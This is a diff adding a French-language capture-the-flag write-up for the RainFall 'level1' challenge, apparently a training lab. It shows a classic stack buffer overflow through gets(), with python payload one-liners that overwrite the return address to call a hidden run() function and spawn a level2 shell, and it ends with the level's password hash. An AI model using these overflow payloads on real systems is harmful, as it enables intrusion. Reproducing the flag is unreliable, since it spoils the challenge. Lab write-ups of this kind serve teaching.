@@ -1,0 +1,79 @@
+https://man7.org/linux/man-pages/man3/gets.3.html
+BUGS 
+
+Never use gets().  Because it is impossible to tell without
+knowing the data in advance how many characters gets() will read,
+and because gets() will continue to store characters past the end
+of the buffer, it is extremely dangerous to use.  It has been used
+to break computer security.  Use fgets() instead.
+
+For more information, see CWE-242 (aka "Use of Inherently
+Dangerous Function") at
+http://cwe.mitre.org/data/definitions/242.html
+
+
+Illegal instruction (core dumped) -> Pour 77 a
+
+Segmentation fault (core dumped)  -> Pour (a > 77)
+
+En regardant les strings constante, je me suis appercue de "Good... Wait what?\n"
+
+Pourtant pas une trace de cette string dans le main, je vois qu'il y a une fonction run
+dans le programme qui n'est pas appele.
+
+Je vais donc forcer l'appel de cette fonction dans gdb si ca ne marche pas,
+je tente un buffer overflow.
+
+gdb> call run()
+Good... Wait what?
+$ whoami
+level1
+$
+
+ca lance un shell mais je suis toujours level1
+
+je vais devoir ecraser la valeur de ret a ebp + 4 a l'aide de mon debordement de tampon en prenant en compte le petit-boutiste et en prenant soin d'envoyer des octets brut et non ceux des touches du claviers.
+
+72 * 'a' permet d'arrive a ebp + 4, le reste sera l'adresse que je veux charger:
+
+0x08048444 est l'adresse de run().
+
+
+je vais remplacer l'adresse de retour par l'adresse de run().
+
+	payload:
+
+
+python -c 'print "A" * 72 + "\x44\x84\x04\x08"' | ./level1
+Illegal instruction (core dumped)
+
+mouais ca ne marche pas comme prevu, je vais mettre la (taille de la stack) * 'a'
+
+level1@RainFall:~$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' | ./level1
+Good... Wait what?
+Segmentation fault (core dumped)
+
+on avance, mais il y a un second (core dumped).
+
+peut etre avec une seconde attaque sur ce core dump. (PS: NOP)
+
+level1@RainFall:~$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
+
+(gdb) run < /tmp/exploit
+
+je breakpoint sur run()
+
+
+je dois maintenir le flux avec 'cat' en plus .
+
+level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
+Good... Wait what?
+ls
+ls: cannot open directory .: Permission denied
+whoami
+level2
+
+c'est bon je suis level2.
+
+cat .pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
